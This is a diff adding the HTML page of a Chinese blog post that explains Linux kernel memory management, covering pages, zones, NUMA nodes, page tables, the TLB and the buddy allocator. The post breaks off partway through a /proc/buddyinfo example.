@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux Kernel 内存管理浅析 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言
+内存管理基础
+类似于用户态进程中的堆（heap），内核也有着自己的一套动态内存管理机制，为了方便这里我们同样将内核中动态分配的内存称为 “堆”。
+Linux kernel 将内存分为 页→区→节点 三级结构，主要有两个内存管理器—— buddy system 与 slab allocator，前者负责以内存页为粒度管理所有可用的物理内存，后者则向前者请求内存页并划分为多个较小的对象（object）以进行细粒度的内存管理。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/kernel/heap/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/kernel/heap/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux Kernel 内存管理浅析
+    </h1>
+    <div class="post-meta"><span title='2025-12-01 09:30:38 +0000 UTC'>2025年12月1日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%89%8d%e8%a8%80" aria-label="前言">前言</a></li>
+                    <li>
+                        <a href="#%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86%e5%9f%ba%e7%a1%80" aria-label="内存管理基础">内存管理基础</a></li>
+                    <li>
+                        <a href="#%e9%a1%b5-%e5%8c%ba-%e8%8a%82%e7%82%b9" aria-label="页-&gt;区-&gt;节点">页-&gt;区-&gt;节点</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%a1%b5" aria-label="页">页</a></li>
+                    <li>
+                        <a href="#%e5%8c%ba" aria-label="区">区</a><ul>
+                            
+                    <li>
+                        <a href="#%e4%b8%ba%e4%bb%80%e4%b9%88%e9%9c%80%e8%a6%81-zone" aria-label="为什么需要 Zone？">为什么需要 Zone？</a></li>
+                    <li>
+                        <a href="#zone-%e5%af%b9%e5%ba%94%e7%9a%84%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84" aria-label="Zone 对应的数据结构">Zone 对应的数据结构</a></li>
+                    <li>
+                        <a href="#%e5%b8%b8%e8%a7%81-zone-%e7%b1%bb%e5%9e%8b" aria-label="常见 Zone 类型">常见 Zone 类型</a><ul>
+                            
+                    <li>
+                        <a href="#1-zone_dma" aria-label="1. ZONE_DMA">1. ZONE_DMA</a></li>
+                    <li>
+                        <a href="#2-zone_normal" aria-label="2. ZONE_NORMAL">2. ZONE_NORMAL</a></li>
+                    <li>
+                        <a href="#3-zone_highmem" aria-label="3. ZONE_HIGHMEM">3. ZONE_HIGHMEM</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#zone-%e7%9a%84%e4%b8%80%e4%ba%9b%e9%87%8d%e8%a6%81%e7%89%b9%e6%80%a7" aria-label="Zone 的一些重要特性">Zone 的一些重要特性</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e8%8a%82%e7%82%b9" aria-label="节点">节点</a><ul>
+                            
+                    <li>
+                        <a href="#node-%e7%9a%84%e6%84%8f%e4%b9%89" aria-label="Node 的意义">Node 的意义</a></li>
+                    <li>
+                        <a href="#uma-%e4%b8%8e-numa" aria-label="UMA 与 NUMA">UMA 与 NUMA</a></li>
+                    <li>
+                        <a href="#node-%e4%b8%8e-cpu-%e7%9a%84%e5%85%b3%e7%b3%bb" aria-label="Node 与 CPU 的关系">Node 与 CPU 的关系</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e9%a1%b5%e8%a1%a8" aria-label="页表">页表</a></li>
+                    <li>
+                        <a href="#buddy-system" aria-label="Buddy System">Buddy System</a></li>
+                    <li>
+                        <a href="#slub-%e5%88%86%e9%85%8d%e5%99%a8" aria-label="Slub 分配器">Slub 分配器</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84" aria-label="数据结构">数据结构</a></li>
+                    <li>
+                        <a href="#%e5%88%86%e9%85%8d%e5%92%8c%e9%87%8a%e6%94%be" aria-label="分配和释放">分配和释放</a></li>
+                    <li>
+                        <a href="#%e5%88%86%e9%85%8d" aria-label="分配">分配</a></li>
+                    <li>
+                        <a href="#%e9%87%8a%e6%94%be" aria-label="释放">释放</a></li>
+                    <li>
+                        <a href="#kmem_cache" aria-label="kmem_cache">kmem_cache</a></li>
+                    <li>
+                        <a href="#kmem_cache_cpu" aria-label="kmem_cache_cpu">kmem_cache_cpu</a></li>
+                    <li>
+                        <a href="#kmem_cache_node" aria-label="kmem_cache_node">kmem_cache_node</a></li>
+                    <li>
+                        <a href="#slab-cache" aria-label="slab cache">slab cache</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e8%8e%b7%e5%be%97%e9%a1%b5" aria-label="获得页">获得页</a><ul>
+                            
+                    <li>
+                        <a href="#%e8%8e%b7%e5%be%97%e5%a1%ab%e5%85%85%e4%b8%ba0%e7%9a%84%e9%a1%b5" aria-label="获得填充为0的页">获得填充为0的页</a></li>
+                    <li>
+                        <a href="#%e9%87%8a%e6%94%be%e9%a1%b5" aria-label="释放页">释放页</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#kmalloc" aria-label="kmalloc">kmalloc</a></li>
+                    <li>
+                        <a href="#kfree" aria-label="kfree">kfree</a></li>
+                    <li>
+                        <a href="#vmalloc" aria-label="vmalloc">vmalloc</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#uaf" aria-label="UAF">UAF</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
+                    <li>
+                        <a href="#%e6%80%9d%e8%b7%af" aria-label="思路">思路</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h2>
+<h2 id="内存管理基础">内存管理基础<a hidden class="anchor" aria-hidden="true" href="#内存管理基础">#</a></h2>
+<p>类似于用户态进程中的堆（heap），内核也有着自己的一套动态内存管理机制，为了方便这里我们同样将内核中动态分配的内存称为 “堆”。</p>
+<p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>，前者负责以内存页为粒度管理所有可用的物理内存，后者则向前者请求内存页并划分为多个较小的对象（object）以进行细粒度的内存管理。</p>
+<pre tabindex="0"><code>用户 / 内核子系统
+        ↓
+kmalloc / kmem_cache_alloc
+        ↓
+SLUB / SLAB / SLOB   ← 对象分配器
+        ↓
+Buddy Allocator     ← 页分配器
+        ↓
+物理内存（page）
+</code></pre><h2 id="页-区-节点">页-&gt;区-&gt;节点<a hidden class="anchor" aria-hidden="true" href="#页-区-节点">#</a></h2>
+<p>Linux 的物理内存管理采用 <strong>页（page）→ 区（zone）→ 节点（node）</strong> 的层次化结构。这是一张非常经典的整体视图，用来自顶向下理解内核如何组织和分配物理内存。</p>
+<p>总体层次结构从抽象层级由高到低：</p>
+<ul>
+<li><strong>节点（Node）</strong>：NUMA 架构下的内存节点，对应 <code>struct pglist_data</code></li>
+<li><strong>区（Zone）</strong>：节点内按用途划分的内存区域，对应 <code>struct zone</code></li>
+<li><strong>页（Page）</strong>：最基本的物理内存管理单位，对应 <code>struct page</code></li>
+</ul>
+<blockquote>
+<p>每一个<strong>物理页框</strong>，在内核中都有且仅有一个对应的 <code>struct page</code> 结构体。</p>
+</blockquote>
+<p>示意图（经典 Overview）：</p>
+<p><img alt="page-zone-node" decoding="async" loading="lazy" src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/page-zone-node.png" style="max-width: 100%; height: auto;"></p>
+<h3 id="页">页<a hidden class="anchor" aria-hidden="true" href="#页">#</a></h3>
+<ul>
+<li>Linux 以内存页（Page）作为<strong>最基本的管理单位</strong></li>
+<li>页大小通常为 <strong>4KB</strong>（也可能是 2MB / 1GB 大页）</li>
+<li>MMU 以“页”为粒度进行地址翻译和页表管理</li>
+</ul>
+<p>关键点：</p>
+<ul>
+<li><code>struct page</code> <strong>描述的是物理页</strong>，而不是虚拟页</li>
+<li>内核中几乎所有的内存分配、回收、迁移、回收策略，最终都作用在 page 上</li>
+</ul>
+<h3 id="区">区<a hidden class="anchor" aria-hidden="true" href="#区">#</a></h3>
+<p>Zone 是按用途划分的页集合。</p>
+<h4 id="为什么需要-zone">为什么需要 Zone？<a hidden class="anchor" aria-hidden="true" href="#为什么需要-zone">#</a></h4>
+<p>内核不能对所有物理页一视同仁，原因主要来自硬件限制：</p>
+<ul>
+<li><strong>DMA 限制</strong>：某些设备只能访问特定物理地址范围</li>
+<li><strong>地址映射限制</strong>：部分架构下，物理内存不能永久映射到内核虚拟地址空间</li>
+</ul>
+<p>因此，Linux 将具有<strong>相似属性和用途</strong>的页分组，形成不同的 Zone。</p>
+<h4 id="zone-对应的数据结构">Zone 对应的数据结构<a hidden class="anchor" aria-hidden="true" href="#zone-对应的数据结构">#</a></h4>
+<ul>
+<li><code>struct zone</code></li>
+<li>每个 zone 内部维护多个 page 链表（空闲链表、LRU 等）</li>
+</ul>
+<p>结构示意：</p>
+<p><img alt="zone_struct" decoding="async" loading="lazy" src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/zone_struct.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="常见-zone-类型">常见 Zone 类型<a hidden class="anchor" aria-hidden="true" href="#常见-zone-类型">#</a></h4>
+<h5 id="1-zone_dma">1. ZONE_DMA<a hidden class="anchor" aria-hidden="true" href="#1-zone_dma">#</a></h5>
+<ul>
+<li>用途：为 DMA 设备分配内存</li>
+<li>特点：物理地址范围受限</li>
+<li>通常用于老旧或受限的硬件设备</li>
+</ul>
+<h5 id="2-zone_normal">2. ZONE_NORMAL<a hidden class="anchor" aria-hidden="true" href="#2-zone_normal">#</a></h5>
+<ul>
+<li>用途：内核常规内存分配</li>
+<li>内核代码、内核数据结构主要来自该区</li>
+<li>在 x86 上：
+<ul>
+<li>大致范围：16MB ~ 896MB</li>
+</ul>
+</li>
+</ul>
+<h5 id="3-zone_highmem">3. ZONE_HIGHMEM<a hidden class="anchor" aria-hidden="true" href="#3-zone_highmem">#</a></h5>
+<ul>
+<li>用途：高端内存，主要用于用户进程数据</li>
+<li>特点：不能永久映射到内核虚拟地址空间</li>
+<li>典型场景：32 位 x86 架构中，896MB 以上的物理内存</li>
+</ul>
+<blockquote>
+<p>在 x86-64 等 64 位架构中，由于内核虚拟地址空间足够大，<strong>通常不存在 ZONE_HIGHMEM</strong>。</p>
+</blockquote>
+<h4 id="zone-的一些重要特性">Zone 的一些重要特性<a hidden class="anchor" aria-hidden="true" href="#zone-的一些重要特性">#</a></h4>
+<ul>
+<li><strong>Zone 只是逻辑划分，没有物理边界意义</strong></li>
+<li>内存分配：
+<ul>
+<li>某些分配必须来自特定 Zone（如 DMA）</li>
+<li>普通分配优先从 ZONE_NORMAL 获取</li>
+<li>在资源紧张时，允许“向下借用”其他 Zone</li>
+</ul>
+</li>
+<li><strong>分配不能跨 Zone</strong>，一次分配只来自一个 Zone</li>
+</ul>
+<h3 id="节点">节点<a hidden class="anchor" aria-hidden="true" href="#节点">#</a></h3>
+<p>Node 是 NUMA 的内存抽象。</p>
+<h4 id="node-的意义">Node 的意义<a hidden class="anchor" aria-hidden="true" href="#node-的意义">#</a></h4>
+<p>Node 是 <strong>NUMA（非一致内存访问）架构</strong> 下的核心概念：</p>
+<ul>
+<li>一个 Node 通常对应一个 <strong>内存控制器（Memory Controller）</strong></li>
+<li>一个 Node 内部包含多个 Zone</li>
+</ul>
+<p>对应结构体：</p>
+<ul>
+<li><code>struct pglist_data</code></li>
+</ul>
+<hr>
+<h4 id="uma-与-numa">UMA 与 NUMA<a hidden class="anchor" aria-hidden="true" href="#uma-与-numa">#</a></h4>
+<ul>
+<li><strong>UMA（统一内存访问）</strong>：
+<ul>
+<li>系统只有一个 Node</li>
+<li>所有 CPU 访问内存代价一致</li>
+</ul>
+</li>
+<li><strong>NUMA</strong>：
+<ul>
+<li>系统有多个 Node</li>
+<li>每个 CPU 更“偏好”访问本地 Node 的内存</li>
+<li>访问远程 Node 内存的延迟更高</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="node-与-cpu-的关系">Node 与 CPU 的关系<a hidden class="anchor" aria-hidden="true" href="#node-与-cpu-的关系">#</a></h4>
+<ul>
+<li>通常：
+<ul>
+<li>一组 CPU ↔ 一个 Node</li>
+<li>一个 Node 包含：
+<ul>
+<li>ZONE_DMA</li>
+<li>ZONE_NORMAL</li>
+<li>（可能有）ZONE_HIGHMEM</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>当本地 Node 内存不足时：
+<ul>
+<li>内核可以从其他 Node 申请内存</li>
+<li>但会产生 <strong>NUMA 访问惩罚</strong></li>
+</ul>
+</li>
+</ul>
+<p>示意图：</p>
+<p><img alt="numa-node" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202109/876323_4VR3BDNNZPJ4YUX.jpg" style="max-width: 100%; height: auto;"></p>
+<h3 id="页表">页表<a hidden class="anchor" aria-hidden="true" href="#页表">#</a></h3>
+<p>页表是操作系统内存管理中虚拟地址到物理地址映射的关键数据结构。它实现了虚拟内存机制，使每个进程用于独立的虚拟地址空间，同时将虚拟地址映射到实际的物理内存页上。</p>
+<p>即：PGD -&gt; PUD -&gt; PMD -&gt; PTE</p>
+<ul>
+<li>
+<p>PGD：页全局目录，顶层页表。在 64 位体系结构中，它是虚拟地址到物理地址转换的入口。</p>
+</li>
+<li>
+<p>PUD：页上层目录。在四级页表结构里，PGD 指向 PUD 表项。</p>
+</li>
+<li>
+<p>PMD：页中间目录。在 PUD 的下一层，指向具体的页表或大页。</p>
+</li>
+<li>
+<p>PTE：页表项。最后一层，指向物理页框。</p>
+</li>
+<li>
+<p>TLB：后备缓冲区，相当于页表查询的缓存。<code>MMU</code>工作的过程就是查询页表的过程，页表放置在内存中时查询开销太大，因此专门有一小片访问更快的区域用于存放<code>地址转换条目</code>，用于提高查找效率。当页表内容有变化的时候，需要清除<code>TLB</code>，以防止地址映射出错。</p>
+</li>
+</ul>
+<p>一个虚拟地址的结构（x86-64，4 级页表）：</p>
+<pre tabindex="0"><code>| PGD | PUD | PMD | PTE | offset |
+  9     9     9     9      12
+</code></pre><p>比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x7f123456789a</span><span class="p">;</span>
+</span></span></code></pre></div><p>CPU 会拆成：</p>
+<ul>
+<li>PGD index</li>
+<li>PUD index</li>
+<li>PMD index</li>
+<li>PTE index</li>
+<li>页内偏移</li>
+</ul>
+<p>一个比较好的说明图片：</p>
+<p><a href="https://bbs.kanxue.com/elink@624K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2"><img src="https://bbs.kanxue.com/upload/attach/202109/876323_7KQ8NJX66JDSW38.jpg" alt="hYeUYR.png" style="zoom:50%;" /></a></p>
+<p>真正的查表过程：</p>
+<ul>
+<li>从 CR3 里取出页表根的物理地址</li>
+<li>根据 PGD index 找 PGD entry</li>
+<li>再跳到 PUD -&gt; PMD -&gt; PTE</li>
+<li>拿到物理页帧号（PFN）</li>
+<li>PFN + offset = 物理地址</li>
+</ul>
+<p>PGD 页表替换（进程切换时发生了什么）</p>
+<p>页表把 CPU 从进程 A 切换到进程 B，内核首先需要做的是换地址空间。</p>
+<p>每个进程都有：</p>
+<pre tabindex="0"><code>task_struct
+ └─ mm_struct
+     └─ pgd   // 页表根（虚拟地址）
+</code></pre><ul>
+<li>A 进程：<code>A-&gt;mm-&gt;pgd</code></li>
+<li>B 进程：<code>B-&gt;mm-&gt;pgd</code></li>
+</ul>
+<p>PGD 页表替换意味着内核决定下一次地址翻译用 B 的那套页表。</p>
+<p>CR3寄存器替换（地址空间真正生效）</p>
+<p>为什么必须写 CR3？因为 MMU 只认 CR3，pgd 对 CPU 来说是空气。</p>
+<p>关键指令：</p>
+<pre tabindex="0"><code>mov cr3, phys(B-&gt;mm-&gt;pgd)
+</code></pre><p>这一步的效果是：</p>
+<ul>
+<li>当前 CPU 的地址翻译根 = B 的页表</li>
+<li>从这一刻起：
+<ul>
+<li><strong>同一个虚拟地址</strong></li>
+<li>翻译成 <strong>完全不同的物理地址</strong></li>
+</ul>
+</li>
+</ul>
+<p>副作用：TLB</p>
+<ul>
+<li>写 CR3 会：
+<ul>
+<li>刷新 TLB（传统）</li>
+<li>或切换 PCID（新 CPU）</li>
+</ul>
+</li>
+</ul>
+<img src="https://bbs.kanxue.com/upload/attach/202109/876323_Q8NNV3EQ4FDKKH6.jpg" alt="hYeaf1.png" style="zoom:50%;" />
+<p><a href="https://bbs.kanxue.com/elink@740K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2"></a></p>
+<p>页表基地址由 cr3 寄存器指定。</p>
+<p>![](./assets/Pasted image 20250831145955.png)</p>
+<p><strong>TLB</strong></p>
+<p>操作系统访问内存：先通过查询页表得到物理地址，然后访问该物理地址读取指令、数据。为了加快映射速度引入 TLB（块表）。</p>
+<p>如果这个 VA -&gt; PA 映射在 TLB 中，<strong>一步命中，连页表都不走</strong>。</p>
+<p>处理器的内存管理单元（MMU）作用：辅助将虚拟地址转换成物理地址。处理器制造商在 MMU 里面增加了一个 TLB 的高速缓存器。</p>
+<p>TLB 是高速缓存的一种，将虚拟地址到物理地址翻译的结果存储在 TLB 表项中（TLB称为块表）。TLB 项中存放转换之后的物理地址，当 TLB 命中时，处理器就不需要到 MMU 中查询页表，查询页表主要耗时，而 TLB 命中提高加快地址翻译速度。</p>
+<p>TLB 页表缓存主要用来缓存我们最近使用的页表项。不同处理器架构的 TLB 表项格式有所不同。</p>
+<p>地址空间标识符（ASID）主要用例区分不同进程的页表项，虚拟机标识符主要用来区分不同虚拟机的页表项。</p>
+<p>Linux 内核改变之后冲刷 TLB 对应 API 函数如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">flush_tlb_all</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">//使所有 TLB 表项失效
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">flush_tlb_mm</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">)</span> <span class="c1">//指定用户地址空间的所有 TLB 表项失效，参数mm为进程的内存描述符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">flush_tlb_kernel_range</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end</span><span class="p">);</span> <span class="c1">//使内核的某个虚拟地址范围 TLB 表项失效
+</span></span></span></code></pre></div><h3 id="buddy-system">Buddy System<a hidden class="anchor" aria-hidden="true" href="#buddy-system">#</a></h3>
+<p>Buddy System（伙伴系统）是内核的物理页分配机制，按 2 的幂次分配页块。主要思想是按照一定策略不断拆分，直接满足指定请求大小的最小块。其中块的大小由其相对根块的位置指定，通常称为 order（阶）。一个最简单的拆分方式就是以 2 为指数进行拆分，例如定义最小块的大小为 64k，order 上限为 4，则最大块的大小为：</p>
+<pre tabindex="0"><code>64K * 2^4 = 1024K
+</code></pre><p>最大块的 order 为 4，最小块的order为0。对于请求大小为k的块，最小块为N，则其order值为align(k)/N。为什么叫buddy system呢？假设一个大块A所分解成的两个小块B和C，其中B和C就相互为彼此的 <del>天使</del> buddy。只有彼此的buddy才能够进行合并。</p>
+<p>在 Linux 内核中，分配和释放较大内容都是直接通过伙伴系统，即：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">alloc_pages</span><span class="p">(</span><span class="kt">gfp_t</span> <span class="n">gfp_mask</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_pages</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">);</span>
+</span></span></code></pre></div><p>order为<code>0-10</code>，指定从哪一阶伙伴中分配，order为<code>n</code>则分配<code>2^n</code>页大小的内存。</p>
+<p>通过读取<code>/proc/buddyinfo</code>可以获取当前系统中 buddy system 的详细信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ cat /proc/buddyinfo
+</span></span><span class="line"><span class="cl">Node 0, zone      DMA      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">1</span>      <span class="m">3</span>
